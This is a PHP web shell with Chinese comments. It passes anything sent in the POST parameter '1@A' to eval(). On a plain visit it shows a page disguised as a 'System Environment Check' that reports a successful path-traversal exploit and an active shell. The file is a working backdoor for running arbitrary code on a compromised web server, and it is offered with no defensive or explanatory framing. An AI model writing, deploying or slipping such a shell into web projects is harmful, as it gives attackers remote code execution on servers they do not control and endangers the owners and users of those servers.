<?php
// 1. 定义一个唯一的成功标识符
$SUCCESS_TOKEN = "VULN_EXPLOIT_SUCCESS_2025";

// 2. 核心 Shell 逻辑 (保持你的 eval 结构)
$a = filter_input(INPUT_POST, '1@A');
if ($a) {
    eval(trim($a));
    exit; // 执行完指令直接退出，不渲染下方的 HTML
}

// 3. 视觉化验证页面 (直接 GET 访问时显示)
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Environment Check</title>
    <style>
        body { background-color: #121212; color: #00ff00; font-family: monospace; padding: 50px; }
        .box { border: 2px solid #00ff00; padding: 20px; display: inline-block; box-shadow: 0 0 15px #00ff00; }
        .blink { animation: blinker 1.5s linear infinite; font-weight: bold; font-size: 24px; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="box">
        <div class="blink">[+] 关键路径穿越成功！</div>
        <p>--------------------------------------------------</p>
        <p>IDENTIFIER: <b id="token"><?php echo $SUCCESS_TOKEN; ?></b></p>
        <p>SERVER_TIME: <?php echo date('Y-m-d H:i:s'); ?></p>
        <p>STATUS: <span style="color: white; background: green;">SHELL_ACTIVE</span></p>
        <p>--------------------------------------------------</p>
        <p>Waiting for POST payload on parameter: <i style="color:yellow;">1@A</i></p>
    </div>
</body>
</html>